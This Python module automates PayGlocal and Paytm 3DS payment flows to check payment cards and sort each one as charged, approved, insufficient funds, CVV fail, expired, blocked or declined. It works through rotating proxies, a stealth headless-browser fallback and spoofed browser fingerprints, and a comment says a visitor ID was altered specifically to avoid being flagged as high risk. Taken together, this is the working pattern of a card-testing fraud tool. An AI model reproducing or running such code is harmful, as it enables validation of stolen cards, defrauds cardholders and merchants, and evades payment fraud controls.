"""curl_cffi gateway flows — PayGlocal (dc->risk_fp->paynow->ipay) + Paytm (3DS2).
No browser needed. Returns (category, real_response) with a REAL verdict, never a crash.
"""
import json
import random
import re
import time
import uuid
import string

from client import PayGlocalClient, build_card_payload
from crypto import decrypt_public_key

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36")

# PayGlocal transaction status enum + reason codes
STATUS_CHARGED = ("SENT_FOR_CAPTURE", "CAPTURED", "SUCCESS", "SUCCESSFUL", "PAID", "COMPLETED")
STATUS_APPROVED = ("AUTHORIZED", "APPROVED")
STATUS_DECLINE = ("ISSUER_DECLINE", "GENERAL_DECLINE", "DECLINED", "FAILED", "REQUEST_ERROR")
RC_INSUFFICIENT = ("GL-201-009", "GL-201-014")
RC_EXPIRED = ("GL-201-007",)
RC_CVV = ("GL-201-006", "GL-201-013")
RC_INVALID = ("GL-201-010", "GL-201-019")
RC_BLOCKED = ("GL-201-012", "GL-201-016")
# "Transaction blocked by acquirer" — cross-border debit / processor risk rule.
# NOT a cardholder's-bank decline; the acquirer refuses to route it.
RC_ACQUIRER_BLOCK = ("GL-201-025",)


def classify_pg_status(d: dict) -> tuple:
    """Classify a PayGlocal dc/paynow/ipay response dict -> (category, real_response)."""
    status = (d.get("status") or "") or ""
    code = (d.get("reasonCode") or "") or ""
    msg = (d.get("message") or "") or ""
    reason = f"{status} {code} {msg}".strip()
    if status == "INPROGRESS":
        if "Cardinal" in json.dumps(d.get("data", {})):
            return "3d", "3DS challenge issued (OTP required)"
        return "3d", "3DS challenge in progress"
    if code in RC_INSUFFICIENT or "INSUFFICIENT" in (status + " " + msg).upper():
        return "insufficient", reason or "insufficient funds / limit"
    if code in RC_EXPIRED:
        return "expired", reason or "card expired"
    if code in RC_CVV:
        return "cvv", reason or "CVV fail"
    if code in RC_INVALID:
        return "invalid", reason or "invalid/lost card"
    if code in RC_BLOCKED:
        return "blocked", reason or "blocked/blacklisted"
    if code in RC_ACQUIRER_BLOCK:
        return "blocked", reason or "blocked by acquirer (cross-border debit / processor risk rule)"
    if status in STATUS_CHARGED:
        return "charged", reason or "payment successful"
    if status in STATUS_APPROVED:
        return "approved", reason or "authorized by issuer"
    if status in STATUS_DECLINE or "DECLINE" in (status + " " + msg).upper():
        return "declined", reason or "card provider declined this payment"
    return "declined", reason or status



def _payglocal_once(xgl: str, card: dict, proxy: str) -> tuple:
    """One attempt: dc -> risk_fp -> decrypt key -> paynow(JWE) -> ipay(JWE).

    Restores the ORIGINAL JWE flow (isEnc=true) + the card's issuing currency
    read from dc(). Only the visitorId was changed from hex to alphanumeric
    (hex was being flagged GL-400-005 "high risk")."""
    pg = PayGlocalClient(xgl, proxy)

    # 1) dc — config + the card's issuing currency
    dc = pg.dc()
    d = (dc.get("data") or {}).get("payflowTxnResponse") or {}
    if not d:
        st = str(dc.get("status") or "")
        if "AUTHENTICATION" in st.upper():
            return "error", f"payglocal token invalid/expired ({st})"
        return "error", f"dc empty: {st} {dc.get('message','')}"
    issuing = ((d.get("displayAmountInfo") or {}).get("issuingCurrencyInfo") or {}).get("currency", "INR")

    # 2) risk/fp — real-looking alphanumeric visitorId -> {kid, key}
    request_id = f"{int(time.time() * 1000)}.{random.randint(100000, 999999)}"
    visitor_id = "".join(random.choices(string.ascii_letters + string.digits, k=20))
    risk = pg.risk_fp(request_id, visitor_id)
    rd = (risk.get("data") or {})
    rk = rd.get("kid", "")
    key_blob = rd.get("key", "")
    if not rk or not key_blob:
        return "error", f"risk_fp empty: {risk.get('status')} {risk.get('message','')}"

    # 3) decrypt the per-txn public key, JWE-encrypt the card payload
    #    (userAgent must match the session's random profile UA)
    pem = decrypt_public_key(key_blob, visitor_id)
    payload = build_card_payload(card, customer_currency=issuing,
                                 browser_details={"userAgent": pg.ua,
                                                  "screenWidth": 1920, "screenHeight": 1080,
                                                  "colorDepth": 24, "timezone": "Asia/Kolkata",
                                                  "language": "en-US"})

    # 4) paynow (JWE) -> INPROGRESS -> ipay (JWE) -> terminal verdict
    pn = pg.paynow(rk, payload, pem)
    st = pn.get("status", "")
    if st != "INPROGRESS":
        return classify_pg_status(pn)

    time.sleep(6)
    ip = pg.ipay(rk, payload, pem)
    return classify_pg_status(ip)


import subprocess as _subprocess
import os as _os


def _get_zip(xgl: str, proxy: str) -> str:
    """Extract the card's billing ZIP from the dc() response (default 18013)."""
    try:
        pg = PayGlocalClient(xgl, proxy)
        dc = pg.dc()
        d = (dc.get("data") or {}).get("payflowTxnResponse") or {}
        billing = d.get("billingCollectionInfo") or {}
        fields = billing.get("billingFields") or []
        if fields:
            return str(fields[0].get("value") or "18013")
    except Exception:
        pass
    return "18013"


def _run_pw_flow(xgl: str, zipc: str, proxy: str, card: dict | None = None) -> dict:
    """Run the Playwright (stealth) full flow -> real terminal verdict."""
    import json as _json
    here = _os.path.dirname(_os.path.abspath(__file__))
    env = dict(_os.environ)
    env.setdefault("PLAYWRIGHT_BROWSERS_PATH", _os.path.expanduser("~/.cache/ms-playwright"))
    py = _os.environ.get("PW_PYTHON", _os.sys.executable)
    args = [py, "pw_flow.py", xgl, zipc, proxy]
    if card:
        args.append(_json.dumps(card))
    res = _subprocess.run(args, capture_output=True, text=True, timeout=120, cwd=here, env=env)
    out = res.stdout.strip()
    if out:
        return _json.loads(out)
    return {"category": "error", "real-response": (res.stderr or "")[-200:]}



def payglocal_check(xgl: str, card: dict, proxy: str, fallback_proxies=None) -> tuple:
    """PayGlocal: Playwright (stealth) full flow for the REAL verdict,
    curl_cffi (JWE) fallback on failure."""
    # 1) Playwright full flow (real declined/charged/insufficient/3d)
    try:
        zipc = _get_zip(xgl, proxy)
        out = _run_pw_flow(xgl, zipc, proxy, card)
        cat = out.get("category")
        if cat and cat != "error":
            return cat, out.get("real-response", "")
    except Exception:
        pass

    # 2) curl_cffi fallback (JWE — non-3DS cards still get a terminal; 3DS -> '3d')
    proxies = [proxy]
    for fp in (fallback_proxies or []):
        if fp and fp not in proxies:
            proxies.append(fp)
    seen = set()
    last_err = ""
    for p in proxies:
        if p in seen:
            continue
        seen.add(p)
        try:
            cat, real = _payglocal_once(xgl, card, p)
        except Exception as e:
            last_err = f"{type(e).__name__}: {e}"
            continue
        if cat == "error":
            low = real.lower()
            if any(k in low for k in ["authentication_failed", "multiple times", "invalid request",
                                      "not allowed", "request_error"]):
                return cat, real
            if "dc empty" in low or "risk_fp" in low:
                last_err = real
                continue
            return cat, real
        return cat, real
    return "error", last_err or "payglocal failed"


def paytm_check(jc, data_val: str, action: str) -> tuple:
    """Paytm 3DS2 via curl_cffi: data -> loader -> 3ds-method -> capturebrowserdetails -> creq -> ACS."""
    try:
        r = jc.session.post(action, data={"data": data_val},
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Accept": "text/html,application/xhtml+xml", "User-Agent": UA,
                     "Origin": "https://secure.paytmpayments.com", "Referer": action},
            allow_redirects=True, timeout=30)
    except Exception as e:
        return "error", f"paytm loader failed: {type(e).__name__}: {e}"

    m = (re.search(r"var\s+APP_DATA\s*=\s*'([^']+)'", r.text)
         or re.search(r"APP_DATA\s*=\s*'([^']+)'", r.text)
         or re.search(r"var\s+appData\s*=\s*'([^']+)'", r.text)
         or re.search(r'var\s+APP_DATA\s*=\s*"([^"]+)"', r.text))
    if not m:
        return "error", f"paytm: no APP_DATA in loader [{r.status_code}] {r.text[:200]}"
    try:
        app_data = json.loads(m.group(1).replace("&quot;", '"').replace("&#39;", "'").replace("&amp;", "&"))
    except Exception:
        return "error", "paytm: bad APP_DATA json"

    method = app_data.get("iFrameform") or {}
    cb = app_data.get("callbackForm") or {}

    # 3DS method (optional, hidden iframe)
    if method.get("actionUrl") and method.get("content"):
        try:
            jc.session.post(method["actionUrl"], data=method["content"],
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Accept": "text/html,*/*", "User-Agent": UA},
                allow_redirects=True, timeout=20)
        except Exception:
            pass

    data_blob = (cb.get("content") or {}).get("data", "")
    cb_url = cb.get("actionUrl", "")
    if not cb_url or not data_blob:
        return "error", "paytm: no callbackForm/data"

    browser = {
        "httpBrowserLanguage": "en-US", "httpBrowserJavaEnabled": "false",
        "httpBrowserJavaScriptEnabled": "true", "httpBroswerColorDepth": "24",
        "httpBroswerScreenHeight": "1080", "httpBrowserScreenWidth": "1920",
        "httpBrowserTimeDifference": "-330", "browserName": UA,
        "userAgentBrowserValue": UA, "data": data_blob,
    }
    try:
        r2 = jc.session.post(cb_url, data=browser,
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Accept": "text/html,application/xhtml+xml", "User-Agent": UA},
            allow_redirects=True, timeout=30)
    except Exception as e:
        return "error", f"paytm capturebrowserdetails failed: {type(e).__name__}: {e}"

    try:
        step = json.loads(r2.text)
    except Exception:
        step = {}
    creq = (step.get("content") or {}).get("creq", "")
    acs_url = step.get("actionUrl", "")

    if creq and acs_url:
        try:
            r3 = jc.session.post(acs_url, data={"creq": creq},
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Accept": "text/html,application/xhtml+xml", "User-Agent": UA},
                allow_redirects=True, timeout=30)
        except Exception as e:
            return "error", f"paytm acs post failed: {type(e).__name__}: {e}"
        body = r3.text
        if re.search(r"name=['\"]otp['\"]", body) or "challengeInfoHeader" in body or "Secure Checkout" in body:
            return "3d", "3DS challenge (OTP required)"
        if "blocked" in body.lower():
            return "blocked", "card blocked from 3DS"
        return "3d", "3DS challenge (Paytm)"
    return "3d", "3DS challenge (Paytm, no creq)"



def paytm_theia_check(jc, gw: dict, number: str, card: dict) -> tuple:
    """Paytm Theia via curl_cffi: processTransaction -> creq -> ACS -> OTP/terminal."""
    import uuid as _uuid
    try:
        from curl_cffi import requests as _creq
        _px = jc.session.proxies.get("https") or jc.session.proxies.get("http")
        _ip = ""
        try:
            _ip = _creq.get("https://api.ipify.org?format=json",
                            proxies={"http": _px, "https": _px},
                            timeout=12, impersonate="chrome150").json().get("ip", "")
        except Exception:
            pass
    except Exception:
        _ip = ""
    _body = {
        "head": {"txnToken": gw["txnToken"], "version": "v1"},
        "body": {
            "paymentMode": "DEBIT_CARD",
            "orderId": gw.get("orderId", ""),
            "mid": gw.get("mid", ""),
            "threeDSDetails": {
                "httpBrowserLanguage": "en-US", "httpBrowserJavaEnabled": False,
                "httpBrowserJavaScriptEnabled": True, "httpBrowserColorDepth": 24,
                "httpBrowserScreenHeight": 1080, "httpBrowserScreenWidth": 1920,
                "httpBrowserTimeDifference": -330, "browserName": UA, "userAgent": UA,
                "cookiesAccepted": True,
                "httpAcceptContent": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "ipAddress": _ip, "fingerprintSessionId": _uuid.uuid4().hex,
            },
            "dccSelectedByUser": False, "paymentCallFromDccPage": True,
        },
    }
    _url = (f"https://secure.paytmpayments.com/theia/api/v1/processTransaction"
            f"?mid={gw.get('mid', '')}&orderId={gw.get('orderId', '')}")
    try:
        r = jc.session.post(_url,
            headers={"Content-Type": "application/json;charset=UTF-8", "Accept": "*/*",
                     "Origin": "https://secure.paytmpayments.com",
                     "Referer": gw.get("action", "https://secure.paytmpayments.com/theia/selectCurrencyPage"),
                     "User-Agent": UA},
            json=_body, timeout=30)
        d = r.json()
    except Exception as e:
        return "error", f"processTransaction failed: {type(e).__name__}: {e}"
    br = (d.get("body") or {})
    ri = br.get("resultInfo") or {}
    creq = (br.get("content") or {}).get("creq", "")
    acs_url = br.get("callbackUrl", "")
    if ri.get("resultStatus") == "F":
        msg = ri.get("resultMsg", "") or ""
        low = msg.lower()
        if "lost in space" in low or "something went wrong" in low:
            return "error", "Paytm: transaction failed (invalid/expired token or session)"
        if "insufficient" in low or "balance" in low or "not enough" in low:
            return "insufficient", f"Paytm: {msg}"
        if "declin" in low or "fail" in low or "reject" in low or "not approved" in low:
            return "declined", f"Paytm: {msg}"
        if "cvv" in low or "security" in low:
            return "cvv", f"Paytm: {msg}"
        if "expired" in low:
            return "expired", f"Paytm: {msg}"
        return "declined", f"Paytm: {msg}"
    if not creq or not acs_url:
        # "S" is only API-success (request accepted), NOT a charge.
        # A real charge needs the 3DS + capture to complete -> report 3d/pending.
        return "3d", "Paytm: 3DS challenge (frictionless, pending)"
    try:
        r2 = jc.session.post(acs_url, data={"creq": creq},
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Accept": "text/html,application/xhtml+xml", "User-Agent": UA},
            allow_redirects=True, timeout=30)
    except Exception as e:
        return "error", f"paytm acs post failed: {type(e).__name__}: {e}"
    b2 = r2.text
    low2 = b2.lower()
    if "lost in space" in low2 or "something went wrong" in low2:
        return "error", "Paytm: transaction failed (invalid/expired token or session)"
    if re.search(r"name=['\"]otp['\"]", b2) or "challengeInfoHeader" in b2 or "Secure Checkout" in b2:
        return "3d", "3DS challenge (OTP required)"
    if "blocked" in low2:
        return "blocked", "card blocked from 3DS"
    return "3d", "Paytm 3DS challenge"
